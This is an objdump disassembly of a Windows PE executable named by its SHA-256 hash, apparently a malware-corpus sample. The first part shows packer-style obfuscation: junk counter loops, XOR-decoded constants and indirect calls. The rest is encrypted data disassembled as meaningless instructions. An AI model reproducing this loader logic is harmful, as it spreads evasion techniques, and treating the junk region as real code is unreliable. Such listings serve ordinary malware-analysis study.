
af4c2f9eb85fd92281d5c999cbd9b17cf289d072615fcdf43ed1eb8d6de19e00.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x42fa00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x42fa04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x42fa08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x42fa0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x42fa38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x42fa3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x42fa40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x42fa10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x42fa14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0xbbcdc454
  40157e:	into   
  40157f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [ecx-0x75],esp
  401596:	mov    cl,BYTE PTR [ebx+0x1d22b38a]
  40159c:	(bad)  
  40159d:	xchg   ecx,eax
  40159e:	test   eax,0x51987e88
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x1c5c06c4],0x1d
  40162d:	and    DWORD PTR ds:0x6e67afb7,edi
  401633:	push   ebp
  401634:	dec    esp
  401635:	test   al,0x3e
  401637:	jecxz  0x4015d0
  401639:	fiadd  DWORD PTR [ebx-0x61]
  40163c:	sub    eax,0xa1b4724c
  401641:	in     al,dx
  401642:	jecxz  0x4015ca
  401644:	adc    eax,ebp
  401646:	outs   dx,DWORD PTR ds:[esi]
  401647:	add    BYTE PTR [eax-0x7e],ch
  40164a:	pop    edx
  40164b:	pop    es
  40164c:	fild   DWORD PTR [ebp+0x620afcd2]
  401652:	dec    esi
  401653:	mov    ebx,0x379246ca
  401658:	xor    BYTE PTR [edi*2-0x666a3110],ah
  40165f:	out    0x25,eax
  401661:	ror    BYTE PTR [ebx-0x46],cl
  401664:	xchg   ecx,ebp
  401666:	jmp    0x4d1d57c8
  40166b:	cmp    eax,0x4367c669
  401670:	sbb    BYTE PTR [ebp+esi*4+0x48],ch
  401674:	or     bh,BYTE PTR [edx+0x59862bb0]
  40167a:	scas   eax,DWORD PTR es:[edi]
  40167b:	mov    dh,0xc
  40167d:	xor    al,0xf8
  40167f:	pushf  
  401680:	js     0x401623
  401682:	jbe    0x401619
  401684:	out    0x7e,eax
  401686:	xor    bl,BYTE PTR [ebx+ebx*8]
  401689:	mov    al,ds:0x2383e145
  40168e:	pop    esp
  40168f:	repz push esi
  401691:	xchg   esi,eax
  401692:	pop    ds
  401693:	hlt    
  401694:	xlat   BYTE PTR ds:[ebx]
  401695:	cwde   
  401696:	mov    esp,DWORD PTR [esi+0xc3cc63]
  40169c:	das    
  40169d:	add    eax,0x5c171081
  4016a2:	jno    0x4016c4
  4016a4:	jbe    0x401655
  4016a6:	lahf   
  4016a7:	(bad)
  4016aa:	pop    edi
  4016ab:	pop    ss
  4016ac:	jb     0x401643
  4016ae:	add    esi,DWORD PTR [ebp-0x4347dfd8]
  4016b4:	jecxz  0x4016cf
  4016b6:	sbb    eax,0x867f63f5
  4016bc:	sbb    al,0x12
  4016be:	lahf   
  4016bf:	dec    esp
  4016c0:	jnp    0x401683
  4016c2:	mov    ?,WORD PTR [edx-0x71]
  4016c5:	cmc    
  4016c6:	add    eax,0xb452ff8a
  4016cb:	pop    esp
  4016cc:	dec    ebp
  4016cd:	into   
  4016ce:	cmp    eax,0x751bb609
  4016d3:	test   dh,dl
  4016d5:	scas   eax,DWORD PTR es:[edi]
  4016d6:	push   edi
  4016d7:	inc    edi
  4016d8:	sbb    eax,0x9d69b97b
  4016dd:	imul   esp,DWORD PTR ds:0xeae37b6a,0xfffffff4
  4016e4:	xor    DWORD PTR [edx-0x905b0ef],edx
  4016ea:	adc    DWORD PTR [ebx+eax*2],ebx
  4016ed:	repnz mov ebp,0xb298b845
  4016f3:	push   ebx
  4016f4:	(bad)  
  4016f5:	aam    0x43
  4016f7:	jnp    0x401758
  4016f9:	sub    eax,0x3fc491a0
  4016fe:	fistp  DWORD PTR [edi]
  401700:	jl     0x40170c
  401702:	mov    BYTE PTR [ebx],dh
  401704:	arpl   WORD PTR [edx-0x9b30bfd],sp
  40170a:	cmp    al,al
  40170c:	pop    es
  40170d:	pop    edx
  40170e:	fnstsw WORD PTR [ecx-0x5e6056a5]
  401714:	inc    ax
  401716:	jmp    0x76a0:0xe7193616
  40171d:	int    0x22
  40171f:	inc    bh
  401721:	inc    edi
  401722:	outs   dx,DWORD PTR ds:[esi]
  401723:	xchg   ebp,eax
  401724:	mov    ecx,0x2b2334f4
  401729:	xor    DWORD PTR [esi],edi
  40172b:	mov    bl,0xd8
  40172d:	clc    
  40172e:	test   esp,ebx
  401730:	push   0xffffffc5
  401732:	out    0xbc,al
  401734:	jge    0x40172a
  401736:	mov    BYTE PTR [edi-0x7a],bh
  401739:	push   esp
  40173a:	loope  0x4016fe
  40173c:	stos   BYTE PTR es:[edi],al
  40173d:	mov    edx,0xeb5ec94a
  401742:	add    edx,eax
  401744:	aad    0x2d
  401746:	das    
  401747:	or     eax,0x4f91bd1f
  40174c:	mov    al,0x7f
  40174e:	push   eax
  40174f:	pop    ss
  401750:	push   cs
  401751:	repz push es
  401753:	cmc    
  401754:	push   esp
  401755:	and    DWORD PTR ds:0xa87a,esp
  40175a:	and    ch,bl
  40175c:	mov    al,ds:0x7d41e680
  401761:	hlt    
  401762:	jnp    0x40179c
  401764:	aas    
  401765:	cld    
  401766:	and    al,0x33
  401768:	rcl    al,0x39
  40176b:	sub    eax,0x24e7f55c
  401770:	pop    esp
  401771:	out    0xec,al
  401773:	loop   0x4017e0
  401775:	inc    edi
  401776:	call   0xe6ede46
  40177b:	ficomp WORD PTR [esi+0x3397e83f]
  401781:	(bad)  
  401782:	jbe    0x40171a
  401784:	cwde   
  401785:	in     al,0xbf
  401787:	imul   ebp,ebp,0x4f
  40178a:	fcomip st,st(0)
  40178c:	adc    al,0x10
  40178e:	pop    ebp
  40178f:	out    dx,eax
  401790:	push   edx
  401791:	loopne 0x4017b3
  401793:	cmp    al,0x5
  401795:	sub    BYTE PTR [edi-0x753d400e],cl
  40179b:	fnstcw WORD PTR [eax]
  40179d:	ret    
  40179e:	cmp    BYTE PTR [eax],bl
  4017a0:	(bad)  
  4017a1:	ja     0x401780
  4017a3:	xchg   ebp,eax
  4017a4:	sub    BYTE PTR [esi-0x51a81b9f],bl
  4017aa:	leave  
  4017ab:	imul   ebp,DWORD PTR [edx],0xffffff87
  4017ae:	(bad)  
  4017b0:	retf   0x32a6
  4017b3:	push   ebp
  4017b4:	(bad)  
  4017b5:	push   0xb88a876e
  4017ba:	lahf   
  4017bb:	and    ecx,edi
  4017bd:	jbe    0x401823
  4017bf:	jle    0x401797
  4017c1:	mov    esi,0xc58cdf8a
  4017c6:	jae    0x4017af
  4017c8:	jno    0x401801
  4017ca:	adc    bl,BYTE PTR [ecx]
  4017cc:	or     BYTE PTR [esi+0x23],cl
  4017cf:	(bad)  
  4017d0:	ficomp DWORD PTR [eax-0x7ed08b1b]
  4017d6:	shr    BYTE PTR [edi+edx*1-0x19],1
  4017da:	jmp    0x4017c1
  4017dc:	(bad)  
  4017dd:	sub    dl,dl
  4017df:	add    al,0xad
  4017e1:	jo     0x4017c0
  4017e3:	pop    esp
  4017e4:	sub    DWORD PTR [ecx-0x6d],esi
  4017e7:	(bad)  
  4017e8:	mov    bl,0xcd
  4017ea:	hlt    
  4017eb:	jns    0x40182b
  4017ed:	mov    dh,0x12
  4017ef:	adc    BYTE PTR [ebp-0x2c],bl
  4017f2:	or     ch,BYTE PTR [edx-0x7fc411e]
  4017f8:	pop    ss
  4017f9:	shl    al,cl
  4017fb:	dec    edi
  4017fc:	adc    ebp,DWORD PTR [esi+ecx*8-0x5e]
  401800:	adc    al,0x1d
  401802:	dec    ebp
  401803:	or     dl,BYTE PTR [esi+0x74]
  401806:	xlat   BYTE PTR ds:[ebx]
  401807:	out    0x31,eax
  401809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40180a:	fstp   TBYTE PTR [edi]
  40180c:	adc    al,0xae
  40180e:	leave  
  40180f:	push   ecx
  401810:	lods   al,BYTE PTR ds:[esi]
  401811:	(bad)  [edx]
  401813:	inc    ebx
  401814:	sbb    al,BYTE PTR ds:0x711abf9b
  40181a:	mov    al,ds:0x6782a589
  40181f:	fst    DWORD PTR [ebx-0x2da9604b]
  401825:	aaa    
  401826:	jns    0x401892
  401828:	cmc    
  401829:	or     ch,BYTE PTR [ebx-0x47715182]
  40182f:	js     0x401813
  401831:	ja     0x4017d2
  401833:	lods   al,BYTE PTR ds:[esi]
  401834:	push   ebp
  401835:	xchg   ebx,eax
  401836:	arpl   WORD PTR [ebx],bx
  401838:	pop    edi
  401839:	test   BYTE PTR [edx+edi*2-0x2da5df4e],0x60
  401841:	ss in  eax,0x40
  401844:	bound  esi,QWORD PTR [edx+0x49]
  401847:	pop    ds
  401848:	xchg   edi,eax
  401849:	xor    eax,0x2f4d52de
  40184e:	popa   
  40184f:	test   eax,0x78b667dd
  401854:	leave  
  401855:	inc    eax
  401856:	shl    BYTE PTR [edx+0x32],0x7f
  40185a:	imul   ebp,DWORD PTR [ebx-0x5e],0xbfe2e20f
  401861:	cmp    ebp,DWORD PTR ds:0x30bc559c
  401867:	inc    edx
  401868:	push   esi
  401869:	shl    edx,1
  40186b:	aaa    
  40186c:	popf   
  40186d:	int    0xd
  40186f:	push   ecx
  401870:	jno    0x4018f1
  401872:	pop    es
  401873:	or     al,0x23
  401875:	aad    0x9a
  401877:	pop    esi
  401878:	adc    eax,DWORD PTR [edi-0x716e8c65]
  40187e:	xlat   BYTE PTR ds:[ebx]
  40187f:	sbb    eax,0x12343da0
  401884:	ret    0xd390
  401887:	jecxz  0x401878
  401889:	and    BYTE PTR [ebp+ebp*4+0x48f4eb40],cl
  401890:	adc    BYTE PTR [eax+eax*8-0x16ecc55b],dh
  401897:	adc    al,0x85
  401899:	jae    0x4018fc
  40189b:	in     al,0xbb
  40189d:	pusha  
  40189e:	push   cs
  40189f:	push   edx
  4018a0:	jge    0x401854
  4018a2:	sbb    edx,esp
  4018a4:	mov    eax,ds:0x87984244
  4018a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018aa:	fmul   QWORD PTR [esi+0x43]
  4018ad:	pushf  
  4018ae:	test   eax,0x9fe8351a
  4018b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018b4:	fwait
  4018b5:	ins    DWORD PTR es:[edi],dx
  4018b6:	push   ds
  4018b7:	test   BYTE PTR [edi+0x1f5535ac],dh
  4018bd:	cmp    DWORD PTR [eax],ebx
  4018bf:	test   eax,0x28312462
  4018c4:	push   ebx
  4018c5:	jmp    0x814ba559
  4018ca:	pop    DWORD PTR [edx-0x597db3a5]
  4018d0:	pop    ebp
  4018d1:	sub    eax,0xf92db243
  4018d6:	add    eax,0x5f34d802
  4018db:	rol    BYTE PTR [ecx-0x4],cl
  4018de:	fs stos BYTE PTR es:[di],al
  4018e1:	shl    BYTE PTR [ecx],1
  4018e3:	into   
  4018e4:	and    al,0x5b
  4018e6:	popa   
  4018e7:	xor    al,BYTE PTR [ecx]
  4018e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018ea:	or     ecx,ecx
  4018ec:	add    BYTE PTR [esp+ecx*1],ch
  4018ef:	cmp    ch,BYTE PTR [ebx]
  4018f1:	mov    eax,ds:0x465027f2
  4018f6:	pop    esp
  4018f7:	jge    0x40196c
  4018f9:	in     al,dx
  4018fa:	loope  0x4018ef
  4018fc:	(bad)  
  4018fd:	xor    BYTE PTR [edx],bl
  4018ff:	aam    0xfd
  401901:	mov    ?,WORD PTR [eax]
  401903:	(bad)  
  401904:	cmp    ecx,DWORD PTR [esi+ebp*8]
  401907:	sbb    DWORD PTR ds:0xb264a433,ebx
  40190d:	jne    0x401901
  40190f:	aaa    
  401910:	mov    bh,0xf6
  401912:	mov    ds:0xa0525f7d,al
  401917:	dec    esp
  401918:	xor    eax,0xa91bf4f8
  40191d:	dec    esp
  40191e:	imul   ecx,DWORD PTR [edi+0x50],0x39794120
  401925:	cdq    
  401926:	clc    
  401927:	gs jl  0x401949
  40192a:	pusha  
  40192b:	dec    eax
  40192c:	inc    esp
  40192d:	bound  esi,QWORD PTR [esi]
  40192f:	int    0x85
  401931:	je     0x401998
  401933:	fstp   QWORD PTR [ebx+edx*4-0x5074c01f]
  40193a:	mov    al,ds:0xbb725d88
  40193f:	sub    ebx,DWORD PTR [ebx-0x50cb73a7]
  401945:	ret    0x7bcc
  401948:	push   cs
  401949:	int3   
  40194a:	cdq    
  40194b:	daa    
  40194c:	frstpm(287 only) 
  40194e:	loop   0x4019b9
  401950:	sbb    bl,BYTE PTR [ecx+0x79]
  401953:	int3   
  401954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401955:	mov    bl,0x89
  401957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401958:	jl     0x40193c
  40195a:	mov    al,0xd6
  40195c:	add    eax,0xc287289b
  401961:	lds    edx,FWORD PTR [esi-0x54]
  401964:	neg    DWORD PTR [edi-0x6d1d5c14]
  40196a:	and    al,0xe1
  40196c:	lea    edi,[ebx+0x7]
  40196f:	(bad)  
  401970:	mov    ebp,0xbc49a85f
  401975:	popf   
  401976:	or     al,0x65
  401978:	(bad)  
  401979:	and    ch,BYTE PTR [edi-0x8]
  40197c:	and    dh,ah
  40197e:	and    cl,BYTE PTR [ecx+0x18ecae8]
  401984:	xor    WORD PTR [ecx+ebx*1+0xd],si
  401989:	fld    QWORD PTR [ecx+0x6a]
  40198c:	stc    
  40198d:	cdq    
  40198e:	add    cl,BYTE PTR [esi]
  401990:	xchg   ecx,eax
  401991:	cwde   
  401992:	stos   DWORD PTR es:[edi],eax
  401993:	adc    bl,BYTE PTR [ecx]
  401995:	xchg   BYTE PTR [ebx],bh
  401997:	dec    dh
  401999:	mov    cl,0x32
  40199b:	dec    ebp
  40199c:	rcr    DWORD PTR [eax+ecx*1+0x53944fa9],1
  4019a3:	mov    eax,ds:0x179447d7
  4019a8:	mov    ch,0x45
  4019aa:	add    ch,0xc7
  4019ad:	xor    BYTE PTR [eax-0x9],bl
  4019b0:	repnz xor DWORD PTR [ecx+0x7b],ecx
  4019b4:	imul   ecx,DWORD PTR [ebp-0x2d],0xffffffee
  4019b8:	in     eax,0xde
  4019ba:	test   al,0x14
  4019bc:	in     al,dx
  4019bd:	jns    0x4019e2
  4019bf:	xor    esp,DWORD PTR [ebx]
  4019c1:	sar    DWORD PTR [eax-0x4b07446f],0x22
  4019c8:	popf   
  4019c9:	mov    al,ds:0x29df0bec
  4019ce:	fidivr DWORD PTR [eax+0xf7bf0bb]
  4019d4:	sti    
  4019d5:	xor    al,0xcb
  4019d7:	cdq    
  4019d8:	sub    edi,DWORD PTR [ecx+ebp*1-0x78]
  4019dc:	jl     0x40196a
  4019de:	xchg   ebp,eax
  4019df:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4019e1:	je     0x40196c
  4019e3:	inc    ebx
  4019e4:	mov    bh,0xa8
  4019e6:	pop    es
  4019e7:	ja     0x4019be
  4019e9:	inc    eax
  4019ea:	outs   dx,DWORD PTR ds:[esi]
  4019eb:	or     cl,BYTE PTR [edi+0x69]
  4019ee:	inc    ebp
